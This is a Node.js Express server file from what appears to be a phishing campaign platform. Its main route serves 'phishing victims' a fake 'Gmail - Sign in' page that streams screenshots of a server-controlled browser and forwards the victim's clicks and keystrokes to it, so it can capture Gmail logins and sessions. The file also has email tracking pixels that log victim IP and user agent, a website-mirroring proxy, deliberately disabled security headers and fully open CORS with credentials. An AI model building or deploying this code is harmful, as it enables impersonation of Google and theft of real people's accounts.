require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const config = require('./config');
const http = require('http');
const socketIo = require('socket.io');
const crypto = require('crypto');
const db = require('./database'); // Add database import
const landingPageService = require('./services/landingPageService');
const websiteMirroringService = require('./services/websiteMirroringService');

// Import routes
const campaignRoutes = require('./routes/campaignRoutes');
const authRoutes = require('./routes/authRoutes');
const templateRoutes = require('./routes/templateRoutes');
const landingPageRoutes = require('./routes/landingPageRoutes');
const profileRoutes = require('./routes/profileRoutes');
const userGroupRoutes = require('./routes/userGroupRoutes');
const userRoutes = require('./routes/userRoutes');
const utilityRoutes = require('./routes/utilityRoutes');
const aiScraperRoutes = require('./routes/aiScraperRoutes');
const { router: gmailBrowserRoutes, gmailBrowserController } = require('./routes/gmailBrowserRoutes');
const trackingService = require('./services/trackingService');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"]
  }
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Apply security, CORS, logging, and JSON parsing middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  // Disable HTTPS requirements and strict security policies
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginResourcePolicy: false,
  originAgentCluster: false,
  strictTransportSecurity: false
}));

// Configure CORS to be completely open
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'],
  allowedHeaders: ['*'],
  credentials: true,
  maxAge: 86400 // 24 hours
}));
app.use(morgan('combined'));
app.use(express.json({ limit: '300mb' }));
app.use(express.urlencoded({ extended: true })); // For parsing form data


// Ensure OPTIONS requests return valid JSON to prevent empty response issues
app.options('*', (req, res) => {
  res.status(200).json({});
});

// Use routes
app.use('/api', campaignRoutes);
app.use('/api', authRoutes);
app.use('/api', templateRoutes);
app.use('/api', landingPageRoutes);
app.use('/api', profileRoutes);
app.use('/api', userGroupRoutes);
app.use('/api', userRoutes);
app.use('/api', utilityRoutes);
app.use('/api', aiScraperRoutes);
app.use('/api/gmail-browser', gmailBrowserRoutes);
app.use('/api/gmail-browser', gmailBrowserRoutes);

// Register landing page routes
landingPageService.registerLandingPageRoutes(app);

// Handle Gmail browser session routing for phishing victims
app.get('/gmail-browser/:sessionToken', async (req, res) => {
  const { sessionToken } = req.params;
  const trackingId = req.query._fstrike_track;
  
  try {
    console.log(`🎯 Gmail phishing victim accessed: ${sessionToken} (tracking: ${trackingId})`);
    
    // First, look up the session token to find the associated campaign
    const query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
    const sessionRecord = await new Promise((resolve, reject) => {
      db.get(query, [sessionToken], (err, row) => {
        if (err) reject(err);
        else resolve(row);
      });
    });

    if (!sessionRecord) {
      console.log(`❌ Gmail session not found: ${sessionToken}`);
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Access Denied</title>
          <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .error { color: #d73527; }
          </style>
        </head>
        <body>
          <h1 class="error">Access Denied</h1>
          <p>The requested Gmail session could not be found or has expired.</p>
        </body>
        </html>
      `);
    }

    const campaignId = sessionRecord.campaign_id;

    // Generate a unique session token for this specific victim
    const victimSessionToken = require('crypto').randomBytes(16).toString('hex');
    
    console.log(`🔐 Creating new Gmail browser session for victim: ${victimSessionToken}`);

    // Create a new browser session for this victim
    const userInfo = {
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      timestamp: new Date(),
      trackingId: trackingId,
      originalSessionToken: sessionToken,
      isVictim: true // Mark this as a victim session
    };

    try {
      const sessionInfo = await gmailBrowserController.gmailBrowserService.createGmailSession(
        victimSessionToken,
        campaignId,
        userInfo
      );

      console.log(`✅ Gmail browser session created for victim: ${victimSessionToken}`);

      // Return a page that displays the browser session content via iframe/proxy
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Gmail - Sign in</title>
          <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            html, body { height: 100%; overflow: hidden; }
            
            .loading-overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background: #fff;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              z-index: 1000;
              transition: opacity 0.5s ease;
            }
            
            .loading-overlay.hidden {
              opacity: 0;
              pointer-events: none;
            }
            
            .gmail-logo {
              margin-bottom: 24px;
            }
            
            .loading-text {
              color: #5f6368;
              font-size: 14px;
              margin-bottom: 24px;
              font-family: 'Google Sans', Roboto, arial, sans-serif;
            }
            
            .progress-bar {
              width: 200px;
              height: 4px;
              background: #e8eaed;
              border-radius: 2px;
              overflow: hidden;
            }
            
            .progress-fill {
              height: 100%;
              background: #1a73e8;
              border-radius: 2px;
              animation: progress 3s ease-out forwards;
            }
            
            @keyframes progress {
              0% { width: 0%; }
              100% { width: 100%; }
            }
            
            #browserContainer {
              width: 100%;
              height: 100vh;
              position: relative;
              background: #fff;
            }
            
            #screenshot {
              width: 100%;
              height: 100%;
              object-fit: contain;
              cursor: pointer;
              display: block;
            }
            
            .click-overlay {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              z-index: 10;
              cursor: pointer;
            }
          </style>
        </head>
        <body>
          <!-- Loading screen -->
          <div class="loading-overlay" id="loadingOverlay">
            <div class="gmail-logo">
              <svg width="75" height="75" viewBox="0 0 75 75">
                <path fill="#ea4335" d="M37.5 47.5L57.5 32.5V55c0 2.5-2 4.5-4.5 4.5H37.5z"/>
                <path fill="#34a853" d="M37.5 47.5L17.5 32.5V55c0 2.5 2 4.5 4.5 4.5H37.5z"/>
                <path fill="#4285f4" d="M57.5 22.5v10l-20 15-20-15v-10c0-2.5 2-4.5 4.5-4.5h31c2.5 0 4.5 2 4.5 4.5z"/>
                <path fill="#fbbc04" d="M17.5 22.5l20 15 20-15L52.5 15H22.5z"/>
              </svg>
            </div>
            <div class="loading-text">Connecting to Gmail...</div>
            <div class="progress-bar">
              <div class="progress-fill"></div>
            </div>
          </div>

          <!-- Browser session container -->
          <div id="browserContainer" style="display: none;">
            <img id="screenshot" src="" alt="Gmail Session">
            <div class="click-overlay" onclick="handleClick(event)"></div>
          </div>

          <script src="/socket.io/socket.io.js"></script>
          <script>
            const sessionToken = '${victimSessionToken}';
            const campaignId = ${campaignId};
            let socket;
            let screenshotImg = document.getElementById('screenshot');
            let lastUpdate = Date.now();

            // Initialize socket connection
            function initSocket() {
              socket = io();
              
              socket.on('connect', () => {
                console.log('Connected to browser session');
                socket.emit('joinGmailSession', {
                  sessionToken: sessionToken,
                  userId: 'victim-' + Date.now()
                });
              });

              socket.on('screenshot', (data) => {
                if (data.sessionToken === sessionToken) {
                  screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
                  lastUpdate = Date.now();
                }
              });

              socket.on('pageNavigation', (data) => {
                console.log('Page navigated to:', data.url);
              });

              // Auto-request screenshots every 2 seconds
              setInterval(() => {
                if (Date.now() - lastUpdate > 10000) { // If no update for 10 seconds
                  requestScreenshot();
                }
              }, 2000);
            }

            // Handle clicks on the browser screen
            function handleClick(event) {
              const rect = event.target.getBoundingClientRect();
              const x = event.clientX - rect.left;
              const y = event.clientY - rect.top;
              
              // Send click to the browser session
              fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  action: 'click',
                  params: { x: x, y: y }
                })
              }).then(() => {
                // Request a new screenshot after clicking
                setTimeout(requestScreenshot, 500);
              });
            }

            // Request a screenshot from the browser session
            function requestScreenshot() {
              fetch('/api/gmail-browser/session/' + sessionToken + '/screenshot')
                .then(response => response.blob())
                .then(blob => {
                  const reader = new FileReader();
                  reader.onload = () => {
                    screenshotImg.src = reader.result;
                    lastUpdate = Date.now();
                  };
                  reader.readAsDataURL(blob);
                });
            }

            // Initialize after loading
            setTimeout(() => {
              document.getElementById('loadingOverlay').classList.add('hidden');
              document.getElementById('browserContainer').style.display = 'block';
              
              initSocket();
              requestScreenshot();
              
              // Track this phishing attempt
              fetch('/api/tracking/click', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  trackingId: '${trackingId}',
                  sessionToken: sessionToken,
                  campaignId: campaignId,
                  action: 'gmail_browser_victim_access',
                  userAgent: navigator.userAgent,
                  timestamp: new Date().toISOString()
                })
              }).catch(() => {});
              
            }, 3000);

            // Handle keyboard input (for when user types in forms)
            document.addEventListener('keydown', (event) => {
              // Forward keyboard events to the browser session
              if (event.target === document.body) {
                fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    action: 'key',
                    params: { 
                      key: event.key,
                      code: event.code,
                      ctrlKey: event.ctrlKey,
                      shiftKey: event.shiftKey,
                      altKey: event.altKey
                    }
                  })
                });
              }
            });
          </script>
        </body>
        </html>
      `);

    } catch (browserError) {
      console.error('Error creating Gmail browser session:', browserError);
      
      // If browser session creation fails, show an error that looks like Gmail
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Gmail - Sign in</title>
          <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
          <style>
            body { 
              font-family: 'Google Sans', Roboto, arial, sans-serif; 
              background: #fff;
              margin: 0;
              padding: 50px 20px;
              text-align: center; 
            }
            .error-container {
              max-width: 400px;
              margin: 0 auto;
              padding: 40px;
              border: 1px solid #dadce0;
              border-radius: 8px;
            }
            h1 { color: #d93025; font-size: 24px; margin-bottom: 16px; }
            p { color: #5f6368; line-height: 1.5; }
            .retry-btn {
              background: #1a73e8;
              color: white;
              border: none;
              padding: 12px 24px;
              border-radius: 4px;
              cursor: pointer;
              margin-top: 20px;
            }
          </style>
        </head>
        <body>
          <div class="error-container">
            <h1>Connection Error</h1>
            <p>We're having trouble connecting to Gmail. Please try again in a moment.</p>
            <button class="retry-btn" onclick="window.location.reload()">Try Again</button>
          </div>
        </body>
        </html>
      `);
    }

  } catch (error) {
    console.error('Error handling Gmail browser route:', error);
    res.status(500).send('Internal server error');
  }
});

// Add a new endpoint to fetch the latest 'In Progress' campaign
app.get('/api/latest-campaign', async (req, res) => {
  try {
    const query = `SELECT * FROM campaigns WHERE status = 'In Progress' ORDER BY created_at DESC LIMIT 1`;
    const result = await db.get(query);

    if (result) {
      res.json(result);
    } else {
      res.status(404).json({ message: 'No campaign with status In Progress found.' });
    }
  } catch (error) {
    console.error('Error fetching latest campaign:', error);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// Direct tracking endpoint
app.get('/track', (req, res) => {
  console.log('🔍 Direct tracking pixel requested:', req.query.email);
  // Extract campaign and user info from URL parameters if available
  const pixelId = crypto.randomUUID();
  trackingService.logOpen(pixelId, req, res, io);
});

// Multiple tracking pixel endpoints for better compatibility
app.get('/tracker/:id.png', (req, res) => {
  console.log('🔍 PNG Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/track/:id/pixel.gif', (req, res) => {
  console.log('🔍 GIF Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/t/:id/p.png', (req, res) => {
  console.log('🔍 Alternative tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

// Update schema to include email_client column if not exists
db.run(`
  ALTER TABLE open_logs 
  ADD COLUMN email_client TEXT DEFAULT 'Unknown'
`, (err) => {
  if (err && !err.message.includes('duplicate column')) {
    console.error('Error adding email_client column:', err);
  }
});

// Test tracking pixel endpoint - for testing only
app.get('/test-tracker/:id', (req, res) => {
  const pixelId = req.params.id;
  console.log('📝 Test tracking endpoint called for pixel:', pixelId);
  
  // Redirect to the actual tracking pixel
  res.redirect(`/tracker/${pixelId}.png`);
});

// CORS Proxy endpoint for handling cross-origin requests
app.all('/api/cors-proxy/:sessionToken', async (req, res) => {
  try {
    const sessionToken = req.params.sessionToken;
    console.log(`🌐 CORS proxy request for session: ${sessionToken}`);
    
    await websiteMirroringService.handleCrossOriginRequest(req, res, sessionToken);
  } catch (error) {
    console.error('Error in CORS proxy:', error);
    res.status(500).json({ error: 'CORS proxy failed' });
  }
});

// Handle preflight CORS requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma, X-Proxy-Target, X-Original-Host');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(200).end();
});

// Website mirroring path-based route handler (must be before other routes)
app.use('/:sessionToken', async (req, res, next) => {
  // Check if this is a valid mirroring session token (32-char hex)
  const sessionToken = req.params.sessionToken;
  
  // Skip static resources and API paths
  if (req.path.startsWith('/api/') || 
      req.path.startsWith('/assets/') ||
      req.path.startsWith('/static/')) {
    return next();
  }
  
  if (sessionToken && /^[0-9a-f]{32}$/i.test(sessionToken)) {
    console.log(`Potential mirroring request detected: ${sessionToken}`);
    
    // Advanced error handling for mirroring
    try {
      return await websiteMirroringService.handleMirrorRequest(sessionToken, req, res);
    } catch (error) {
      console.error(`Error in mirroring handler: ${error.message}`);
      return res.status(500).send(`
        <html>
          <head>
            <title>Proxy Error</title>
            <style>body{font-family:sans-serif;max-width:600px;margin:40px auto;line-height:1.6}</style>
            <meta http-equiv="refresh" content="5;url=/${sessionToken}/">
          </head>
          <body>
            <h2>Error connecting to website</h2>
            <p>There was a problem connecting to the target website. Redirecting to homepage in 5 seconds...</p>
            <p><a href="/${sessionToken}/">Click here if you're not redirected automatically</a></p>
          </body>
        </html>
      `);
    }
  }
  
  next(); // Not a mirroring request, continue to other routes
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('New client connected', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected', socket.id);
  });
});

// Pass the Socket.IO instance to services that need real-time updates
websiteMirroringService.setSocketIO(io);
gmailBrowserController.setSocketIO(io);

app.get('/', (req, res) => {
  res.json({ status: 'Backend is running' });
});

// Catch-all for undefined routes - always returns JSON
app.use((req, res) => {
  res.status(404).json({ message: 'Not Found' });
});

// Global error handler for unexpected errors
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  
  // In development, return the error details
  if (process.env.NODE_ENV !== 'production') {
    return res.status(500).json({ 
      message: 'Internal Server Error', 
      error: err.message,
      stack: err.stack 
    });
  }
  
  // In production, hide error details
  res.status(500).json({ message: 'Internal Server Error' });
});

// Start the server
const PORT = config.port;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
  console.log(`Tracking URL: ${config.trackingUrl}/tracker/:id.png`);
});

// Handle server shutdown
process.on('SIGINT', async () => {
  console.log('Shutting down server...');
  
  process.exit(0);
});
